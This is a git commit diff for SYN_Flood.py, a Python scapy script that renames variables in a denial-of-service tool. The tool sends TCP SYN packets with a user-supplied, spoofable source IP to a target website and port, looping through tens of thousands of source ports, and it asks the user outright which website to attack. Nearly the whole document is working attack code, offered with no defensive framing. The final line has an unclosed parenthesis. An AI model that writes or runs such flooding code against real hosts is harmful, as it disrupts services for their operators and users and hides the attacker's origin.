bb906c95cf78761ab993f65d9d02d548da504768
Moses Arocha <carocha24@gmail.com>
2016-09-16 15:48:30 -0500

    Update

--- SYN_Flood.py
+++ SYN_Flood.py
@@ -5,18 +5,18 @@
 import socket
 from scapy.all import *
 
-def SynAttack(Source, Target, DestinationPort): 
+def SynAttack(Source, Target, Destination_Port): 
     for sport in range(1024, 65535):				# Continues to send packets 64,511 times
-        IPlayer = IP(src=Source, dst=Target)			 
-	TCPlayer = TCP(sport=sport, dport=DestinationPort)	# The destination port of attack is defined by the user, required!
-	packet = IPlayer / TCPlayer
+        IP_layer = IP(src=Source, dst=Target)			 
+	TCP_layer = TCP(sport=sport, dport=Destination_Port)	# The destination port of attack is defined by the user, required!
+	packet = IP_layer / TCP_layer
 	send(packet)				
 
 Source = raw_input("\n\n\t What is the Source IP Address : ")
 Target = raw_input("\n\n\t What is the Website Wished To Attack? http://") 
 socket.gethostbyname(Target)					# Allows the intergretion of a NS lookup, so users can insert websites.
-DestinationPort = int(raw_input("\n\n\t What Port Would You Like To Attack Through? : ")) 
+Destination_Port = int(raw_input("\n\n\t What Port Would You Like To Attack Through? : ")) 
 
 if not os.geteuid() == 0:
     sys.exit('Must Be Root!')
-SynAttack(Source, Target, DestinationPort	 # References the SynAttack function, must be placed last so all error handling can occur.
+SynAttack(Source, Target, Destination_Port	 # References the SynAttack function, must be placed last so all error handling can occur.
